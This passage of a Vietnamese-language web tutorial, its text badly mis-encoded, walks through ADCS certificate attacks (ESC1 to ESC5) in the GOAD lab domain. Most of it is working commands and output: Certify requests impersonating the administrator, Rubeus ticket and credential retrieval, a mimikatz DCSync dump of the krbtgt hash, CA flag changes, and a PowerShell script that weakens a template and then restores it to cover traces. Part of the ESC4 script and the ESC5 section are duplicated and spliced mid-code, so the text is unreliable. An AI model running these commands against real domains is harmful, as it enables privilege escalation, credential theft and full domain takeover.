                                    <p><strong>Ph∆∞∆°ng ph√°p 1: OpenSSL (ƒëa n·ªÅn t·∫£ng)</strong></p>
                                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>openssl pkcs12 -in cert.pem -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out administrator.pfx</code></pre>
                                
                                    <p><strong>Ph∆∞∆°ng ph√°p 2: Certutil (Windows)</strong></p>
                                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>certutil -MergePFX .\cert.pem .\administrator.pfx</code></pre>
                                </div>
                            </div>

                            <div class="space-y-4">
                                <h4 class="text-lg text-green-400 font-semibold">B∆∞·ªõc 3: X√°c th·ª±c v·ªõi Rubeus</h4>
                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code># Nh·∫≠n NTLM Hash tr·ª±c ti·∫øp
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials

# Ho·∫∑c nh·∫≠n TGT
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'essos.local\administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6MIIEtqADAgEFoQ8bDUVTU09TLkxPQ0FM
      ...base64 encoded ticket...

[*] Action: Describe Ticket

  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 10:30:15 AM
  EndTime                  : 1/3/2025 8:30:15 PM
  RenewTill                : 1/10/2025 10:30:15 AM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  : rc4_hmac
  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==

  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)
  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)
</code></pre>
                            </div>

                            <div class="space-y-4">
                                <h4 class="text-lg text-green-400 font-semibold">B∆∞·ªõc 4: Th·ª±c hi·ªán DCSync</h4>
                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...

[*] Action: Import Ticket
[+] Ticket successfully imported!

# B√¢y gi·ªù th·ª±c hi·ªán DCSync d∆∞·ªõi quy·ªÅn qu·∫£n tr·ªã vi√™n
mimikatz.exe "lsadump::dcsync /domain:essos.local /user:krbtgt"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:essos.local /user:krbtgt
[DC] 'essos.local' will be the domain
[DC] 'meereen.essos.local' will be the DC server
[DC] 'krbtgt' will be the DSRM user

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 1/15/2023 2:14:32 PM
Object Security ID   : S-1-5-21-1394808576-3393508183-1134699666-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a577fcf16cfef780a2ceb343ec39a0d9
    ntlm- 0: a577fcf16cfef780a2ceb343ec39a0d9
    lm  - 0: 367ac3b3d1f4d80b8f52a7b6e8c1d2e9
</code></pre>
                            </div>

                            <div class="space-y-4">
                                <h4 class="text-lg text-green-400 font-semibold">K·ªπ Thu·∫≠t N√¢ng Cao</h4>
                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code># S·ª≠ d·ª•ng tham s·ªë /sid ƒë·ªÉ tƒÉng ƒë·ªô ch√≠nh x√°c
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500

# Ho·∫∑c s·ª≠ d·ª•ng Flag /getcredentials ƒë·ªÉ tr√≠ch xu·∫•t hash NTLM tr·ª±c ti·∫øp
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /getcredentials

# S·ª≠ d·ª•ng certutil -MergePFX cho quy tr√¨nh Windows native
certutil -MergePFX .\cert.pem .\administrator.pfx

# T√¨m ki·∫øm chi ti·∫øt h∆°n v·ªõi Flag /enabled /enrolleeSuppliesSubject
Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject
</code></pre>
                            </div>
                        </div>
                    </div>
                </section>

                <!-- ESC2: Misconfigured Certificate Templates with Any Purpose EKU -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC2: Khai Th√°c M·∫´u Ch·ª©ng Ch·ªâ v·ªõi EKU B·∫•t K·ª≥</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC2 nh·∫Øm v√†o c√°c m·∫´u c√≥ "B·∫•t k·ª≥ M·ª•c ƒë√≠ch n√†o" trong M·ª•c ƒë√≠ch Kh√≥a M·ªü r·ªông, c√≥ nghƒ©a l√† ch·ª©ng ch·ªâ c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng cho b·∫•t k·ª≥ m·ª•c ƒë√≠ch n√†o.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">ƒêi·ªÅu Ki·ªán Vulnerability</h3>
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>
                            M·∫´u ch·ª©ng ch·ªâ c√≥ <strong>Any Purpose EKU</strong>
                            (OID: 2.5.29.37.0)
                        </li>
                        <li>
                            <strong>Ng∆∞·ªùi d√πng Mi·ªÅn</strong>
                            c√≥ quy·ªÅn ƒëƒÉng k√Ω
                        </li>
                        <li>
                            Kh√¥ng y√™u c·∫ßu <strong>ph√™ duy·ªát c·ªßa qu·∫£n l√Ω</strong>
                        </li>
                    </ul>
                    
                    <p>
                        <strong>L∆∞u √Ω Quan tr·ªçng:</strong>
                        ESC2 m·ªôt m√¨nh kh√¥ng cho ph√©p gi·∫£ m·∫°o tr·ª±c ti·∫øp c√°c ng∆∞·ªùi d√πng kh√°c nh∆∞ ESC1. M·ªôt ch·ª©ng ch·ªâ Any Purpose tr·ªü n√™n th·ª±c s·ª± nguy hi·ªÉm ch·ªâ khi CA ho·∫∑c m·∫´u c≈©ng cho ph√©p ti√™m SAN/SID (ESC 6/9/10). Tr√™n c√°c m√°y ch·ªß ƒëi·ªÅu khi·ªÉn mi·ªÅn ƒë√£ ƒë∆∞·ª£c v√° ho√†n to√†n v·ªõi vi·ªác th·ª±c thi ƒë·∫ßy ƒë·ªß c√°c b·∫£n v√° KB5014754 t·ª´ th√°ng 5 nƒÉm 2022, m·ªôt ch·ª©ng ch·ªâ Any-Purpose t·ª± n√≥ s·∫Ω kh√¥ng v∆∞·ª£t qua ƒë∆∞·ª£c vi·ªác √°nh x·∫° ch·ª©ng ch·ªâ m·∫°nh.
                    </p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Khai Th√°c</h3>
                    <p>H√£y ki·ªÉm tra c√°c m·∫´u ESC2 trong GOAD:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC2
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : 0x0
    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Any Purpose
    msPKI-Application-Policies    : Any Purpose
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow
</code></pre>
                    
                    <p>Trong GOAD g·ªëc, m·∫´u ESC2 ƒë∆∞·ª£c sao ch√©p t·ª´ m·∫´u Ng∆∞·ªùi d√πng t√≠ch h·ª£p s·∫µn v√† ch·ªâ gi·ªØ l·∫°i EKU Any-Purpose (kh√¥ng c√≥ Flag ENROLLEE_SUPPLIES_SUBJECT). N·∫øu lab c·ªßa b·∫°n hi·ªÉn th·ªã Flag n√†y, ƒë√≥ l√† s·ª± k·∫øt h·ª£p c·ªßa ESC1 + AnyPurpose.</p>
                    
                    <p>B√¢y gi·ªù y√™u c·∫ßu ch·ª©ng ch·ªâ v·ªõi Any Purpose EKU (nh∆∞ ch√≠nh b·∫°n)</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC2

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC2
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 8

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3kT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
...certificate data...
-----END CERTIFICATE-----
</code></pre>
                    
                    <p>S·ª≠ d·ª•ng ch·ª©ng ch·ªâ cho x√°c th·ª±c kh√°ch h√†ng (nh∆∞ ng∆∞·ªùi y√™u c·∫ßu)</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Rubeus.exe asktgt /user:missandei /certificate:anypurpose.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!
</code></pre>
                    
                    <p>EKU B·∫•t k·ª≥ v·∫´n c√≥ th·ªÉ nguy hi·ªÉm v√¨ n√≥ v∆∞·ª£t qua nhi·ªÅu ki·ªÉm tra x√°c th·ª±c ch·ª©ng ch·ªâ v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng cho k√Ω m√£, x√°c th·ª±c m√°y ch·ªß v√† c√°c m·ª•c ƒë√≠ch kh√°c ngo√†i tr∆∞·ªùng h·ª£p s·ª≠ d·ª•ng d·ª± ki·∫øn.</p>
                    </div>
                </section>

                <!-- ESC3: Enrollment Agent Templates -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC3: Khai Th√°c M·∫´u Ch·ª©ng Ch·ªâ ƒê·∫°i L√Ω ƒêƒÉng K√Ω</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC3 l√† m·ªôt k·ªπ thu·∫≠t r·∫•t th√∫ v·ªã khai th√°c c√°c m·∫´u ch·ª©ng ch·ªâ c·∫•p quy·ªÅn cho ƒê·∫°i l√Ω Y√™u c·∫ßu Ch·ª©ng ch·ªâ (Enrollment Agent). V·ªÅ c∆° b·∫£n, b·∫°n c√≥ th·ªÉ y√™u c·∫ßu ch·ª©ng ch·ªâ thay m·∫∑t cho ng∆∞·ªùi kh√°c khi b·∫°n c√≥ ƒë∆∞·ª£c ch·ª©ng ch·ªâ ƒë·∫°i l√Ω.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Lu·ªìng T·∫•n C√¥ng</h3>
                    <p>C√°c b∆∞·ªõc t·∫•n c√¥ng kh√° ƒë∆°n gi·∫£n:</p>
                    
                    <ol class="list-decimal list-inside space-y-2 ml-4">
                        <li>Y√™u c·∫ßu m·ªôt ch·ª©ng ch·ªâ ƒê·∫°i l√Ω ƒêƒÉng k√Ω</li>
                        <li>S·ª≠ d·ª•ng ch·ª©ng ch·ªâ ƒë·∫°i l√Ω ƒë√≥ ƒë·ªÉ y√™u c·∫ßu ch·ª©ng ch·ªâ cho ng∆∞·ªùi kh√°c</li>
                        <li>X√°c th·ª±c d∆∞·ªõi danh nghƒ©a nh·ªØng ng∆∞·ªùi d√πng ƒë√≥</li>
                    </ol>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Tri·ªÉn Khai</h3>
                    <p>H√£y xem ƒëi·ªÅu n√†y ho·∫°t ƒë·ªông nh∆∞ th·∫ø n√†o trong m√¥i tr∆∞·ªùng GOAD c·ªßa ch√∫ng ta:</p>
                    
                    <p>B∆∞·ªõc 1: Y√™u c·∫ßu ch·ª©ng ch·ªâ Enrollment Agent
M·∫´u t√≠ch h·ª£p s·∫µn ƒë∆∞·ª£c g·ªçi l√† "EnrollmentAgent" - sao ch√©p n√≥ th√†nh ESC3-CRA cho lab c·ªßa b·∫°n n·∫øu c·∫ßn</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:EnrollmentAgent

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : EnrollmentAgent
[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 9

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzGQ5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEz
...enrollment agent certificate...
-----END CERTIFICATE-----
</code></pre>
                    
                    <p>B∆∞·ªõc 2: S·ª≠ d·ª•ng ch·ª©ng ch·ªâ ƒë·∫°i l√Ω ƒë·ªÉ y√™u c·∫ßu ch·ª©ng ch·ªâ cho Qu·∫£n tr·ªã vi√™n Mi·ªÅn</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /onbehalfof:ESSOS\administrator /enrollcert:agent.pfx /enrollcertpw:mimikatz

[*] Action: Request a Certificates on behalf of another user
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : User
[*] On behalf of            : ESSOS\administrator
[*] Agent Certificate       : agent.pfx

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 10

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA8Fj9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEzGCq5VJXpF8rTQ
...administrator certificate...
-----END CERTIFICATE-----
</code></pre>
                    
                    <p>B∆∞·ªõc 3: X√°c th·ª±c d∆∞·ªõi danh nghƒ©a qu·∫£n tr·ªã vi√™n</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Rubeus.exe asktgt /user:administrator /certificate:admin.pfx

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local
[+] TGT request successful!

  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  StartTime                : 1/3/2025 11:15:23 AM
  EndTime                  : 1/3/2025 9:15:23 PM
  RenewTill                : 1/10/2025 11:15:23 AM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
</code></pre>
                    
                    <p>
                        Ho√†n h·∫£o! Ch√∫ng t√¥i ƒë√£ n√¢ng c·∫•p t·ª´ <code>khal.drogo</code>
                        l√™n <code>administrator</code>
                        b·∫±ng c√°ch s·ª≠ d·ª•ng k·ªπ thu·∫≠t ESC3.
                    </p>
                    </div>
                </section>

                <!-- ESC4: Vulnerable Certificate Template Access Control -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC4: Khai Th√°c Quy·ªÅn Truy C·∫≠p M·∫´u Ch·ª©ng Ch·ªâ</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC4 l√† m·ªôt trong nh·ªØng k·ªπ thu·∫≠t y√™u th√≠ch c·ªßa t√¥i v√¨ n√≥ r·∫•t tinh vi. Thay v√¨ khai th√°c c√°c m·∫´u d·ªÖ b·ªã t·ªïn th∆∞∆°ng hi·ªán c√≥, b·∫°n s·ª≠a ƒë·ªïi m·ªôt m·∫´u b·∫£o m·∫≠t ƒë·ªÉ l√†m cho n√≥ d·ªÖ b·ªã t·ªïn th∆∞∆°ng, khai th√°c n√≥, sau ƒë√≥ x√≥a d·∫•u v·∫øt c·ªßa b·∫°n.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Chi·∫øn L∆∞·ª£c Khai Th√°c</h3>
                    <p>D∆∞·ªõi ƒë√¢y l√† c√°ch t·∫•n c√¥ng ho·∫°t ƒë·ªông:</p>
                    
                    <ol class="list-decimal list-inside space-y-2 ml-4">
                        <li>T√¨m c√°c m·∫´u m√† b·∫°n c√≥ quy·ªÅn truy c·∫≠p nguy hi·ªÉm (WriteProperty ho·∫∑c WriteOwner)</li>
                        <li>S·ª≠a ƒë·ªïi m·∫´u ƒë·ªÉ l√†m cho n√≥ d·ªÖ b·ªã t·ªïn th∆∞∆°ng v·ªõi ESC1</li>
                        <li>Khai th√°c m·∫´u m·ªõi d·ªÖ b·ªã t·ªïn th∆∞∆°ng</li>
                        <li>X√≥a b·ªè c√°c s·ª≠a ƒë·ªïi c·ªßa b·∫°n ƒë·ªÉ che gi·∫•u d·∫•u v·∫øt</li>
                    </ol>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Tri·ªÉn Khai Th·ª±c T·∫ø</h3>
                    <p>H√£y xem ch√∫ng ta c√≥ th·ªÉ s·ª≠a ƒë·ªïi g√¨ trong GOAD. T√¨m c√°c m·∫´u c√≥ ACL d·ªÖ b·ªã t·ªïn th∆∞∆°ng:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC4
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : 0x0
    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow
      Object Control Permissions
        Owner                       : ESSOS\Administrator
        WriteProperty Principals    : ESSOS\khal.drogo                     Access: Allow
        WriteDacl Principals        : ESSOS\Administrator

# First, backup original template settings for cleanup
Get-ADObject "CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties * | Select-Object * | Export-Clixml ESC4-backup.xml

# Modify template to enable ENROLLEE_SUPPLIES_SUBJECT
$template = Get-ADObject "CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}

[*] Template ESC4 modified to enable ENROLLEE_SUPPLIES_SUBJECT

# Wait for AD replication
Start-Sleep -Seconds 30

# Request certificate with arbitrary SAN
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC4 /altname:upn:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : ESC4
[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 11

# Authenticate as administrator
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local
[+] TGT request successful!

# Restore original template (cleanup)
$template = Get-ADObject "CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}

[*] Template ESC4 restored to original configuration
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">S·ª≠a ƒê·ªïi M·∫´u PowerShell</h3>
                    <p>ƒê√¢y l√† m·ªôt k·ªãch b·∫£n m·∫°nh m·∫Ω h∆°n ƒë·ªÉ s·ª≠a ƒë·ªïi m·∫´u trong m√¥i tr∆∞·ªùng GOAD:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>function Modify-CertificateTemplate {
    param(
        [string]$TemplateName,
        [switch]$EnableSubjectAltName,
        [switch]$Restore,
        [string]$Domain = "essos.local"
    )
    
    $configPath = "CN=Configuration," + (Get-ADDomain -Identity $Domain).DistinguishedName
    $templatePath = "CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configPath"
    
    try {
        $template = Get-ADObject $templatePath -Properties "msPKI-Certificate-Name-Flag"
        
        if ($Restore) {
            # Restore to secure setting
            Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}
            Write-Host "[+] Template $TemplateName restored to secure configuration"
        } else {
            # Enable ENROLLEE_SUPPLIES_SUBJECT
            Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}
            Write-Host "[+] Template $TemplateName modified to enable subject specification"
        }
        
        # Wait for AD replication
        Write-Host "[*] Waiting for AD replication..."
        Start-Sleep -Seconds 30
        
    } catch {
        Write-Error "Failed to modify template: $($_.Exception.Message)"
    }
}

# Usage in GOAD environment
Modify-CertificateTemplate -TemplateName "ESC4" -EnableSubjectAltName -Domain "essos.local"
# ... perform attack ...
Modify-CertificateTemplate -TemplateName "ESC4" -Restore -Domain "essos.local"
</code></pre>
                    </div>
                </section>

                <!-- ESC5: Vulnerable PKI Object Access Control -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC5: Khai Th√°c Quy·ªÅn Truy C·∫≠p ƒê·ªëi T∆∞·ª£ng PKI</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC5 khai th√°c c√°c quy·ªÅn y·∫øu tr√™n ch√≠nh c√°c ƒë·ªëi t∆∞·ª£ng PKI, bao g·ªìm m√°y ch·ªß CA v√† container m·∫´u ch·ª©ng ch·ªâ.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">C√°c Vector T·∫•n C√¥ng</h3>
                    <ol class="list-decimal list-inside space-y-2 ml-4">
                        <li>
                            <strong>ƒê·ªëi T∆∞·ª£ng M√°y Ch·ªß CA</strong>
                            : Quy·ªÅn WriteProperty cho ph√©p thay ƒë·ªïi c·∫•u h√¨nh
                        </li>
                        <li>
                            <strong>Container M·∫´u Ch·ª©ng Ch·ªâ</strong>
                            : GenericWrite cho ph√©p t·∫°o m·∫´u
                        </li>
                        <li>
                            <strong>C√°c ƒê·ªëi T∆∞·ª£ng CA Ri√™ng L·∫ª</strong>
                            : Nhi·ªÅu quy·ªÅn nguy hi·ªÉm kh√°c nhau
                        </li>
                    </ol>
                    
                    <p>H√£y ki·ªÉm tra nh·ªØng g√¨ ch√∫ng ta c√≥ trong GOAD. Ki·ªÉm tra quy·ªÅn c·ªßa ƒë·ªëi t∆∞·ª£ng CA trong mi·ªÅn essos.local:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Get-ADObject "CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties nTSecurityDescriptor
        [switch]$EnableSubjectAltName,
        [switch]$Restore,
        [string]$Domain = "essos.local"
    )
    
    $configPath = "CN=Configuration," + (Get-ADDomain -Identity $Domain).DistinguishedName
    $templatePath = "CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configPath"
    
    try {
        $template = Get-ADObject $templatePath -Properties "msPKI-Certificate-Name-Flag"
        
        if ($Restore) {
            # Restore to secure setting
            Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}
            Write-Host "[+] Template $TemplateName restored to secure configuration"
        } else {
            # Enable ENROLLEE_SUPPLIES_SUBJECT
            Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}
            Write-Host "[+] Template $TemplateName modified to enable subject specification"
        }
        
        # Wait for AD replication
        Write-Host "[*] Waiting for AD replication..."
        Start-Sleep -Seconds 30
        
    } catch {
        Write-Error "Failed to modify template: $($_.Exception.Message)"
    }
}

# Usage in GOAD environment
Modify-CertificateTemplate -TemplateName "ESC4" -EnableSubjectAltName -Domain "essos.local"
# ... perform attack ...
Modify-CertificateTemplate -TemplateName "ESC4" -Restore -Domain "essos.local"
</code></pre>
                    </div>
                </section>

                <!-- ESC5: Vulnerable PKI Object Access Control -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC5: Khai Th√°c Quy·ªÅn Truy C·∫≠p ƒê·ªëi T∆∞·ª£ng PKI</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC5 khai th√°c c√°c quy·ªÅn y·∫øu tr√™n ch√≠nh c√°c ƒë·ªëi t∆∞·ª£ng PKI, bao g·ªìm m√°y ch·ªß CA v√† container m·∫´u ch·ª©ng ch·ªâ.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">C√°c Vector T·∫•n C√¥ng</h3>
                    <ol class="list-decimal list-inside space-y-2 ml-4">
                        <li>
                            <strong>ƒê·ªëi T∆∞·ª£ng M√°y Ch·ªß CA</strong>
                            : Quy·ªÅn WriteProperty cho ph√©p thay ƒë·ªïi c·∫•u h√¨nh
                        </li>
                        <li>
                            <strong>Container M·∫´u Ch·ª©ng Ch·ªâ</strong>
                            : GenericWrite cho ph√©p t·∫°o m·∫´u
                        </li>
                        <li>
                            <strong>C√°c ƒê·ªëi T∆∞·ª£ng CA Ri√™ng L·∫ª</strong>
                            : Nhi·ªÅu quy·ªÅn nguy hi·ªÉm kh√°c nhau
                        </li>
                    </ol>
                    
                    <p>H√£y ki·ªÉm tra nh·ªØng g√¨ ch√∫ng ta c√≥ trong GOAD. Ki·ªÉm tra quy·ªÅn c·ªßa ƒë·ªëi t∆∞·ª£ng CA trong mi·ªÅn essos.local:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Get-ADObject "CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties nTSecurityDescriptor

DistinguishedName : CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
Name              : ESSOS-CA
ObjectClass       : pKIEnrollmentService
ObjectGUID        : 4f8bd644-2c29-418c-93f1-fe926f91f6b4

# In GOAD, khal.drogo has interesting permissions on the CA
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Thay ƒê·ªïi C·∫•u H√¨nh CA</h3>
                    <p>N·∫øu b·∫°n c√≥ quy·ªÅn WriteProperty, h√£y s·ª≠a ƒë·ªïi c√†i ƒë·∫∑t CA. B·∫≠t SAN trong c√°c ch·ª©ng ch·ªâ ƒë∆∞·ª£c ph√°t h√†nh:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

CertUtil: -setreg command completed successfully.
The command completed successfully.
</code></pre>
                    
                    <p>Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª• ch·ª©ng ch·ªâ ƒë·ªÉ √°p d·ª•ng thay ƒë·ªïi</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>net stop certsvc &#x26;&#x26;net start certsvc

The Certificate Services service is stopping.
The Certificate Services service was stopped successfully.
The Certificate Services service is starting.
The Certificate Services service was started successfully.

# Wait for services to fully restart
Start-Sleep -Seconds 10
</code></pre>
                    
                    <p>B√¢y gi·ªù ch√∫ng ta c√≥ th·ªÉ y√™u c·∫ßu ch·ª©ng ch·ªâ v·ªõi SAN t·ª´ b·∫•t k·ª≥ m·∫´u n√†o:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:upn:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : User
[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local
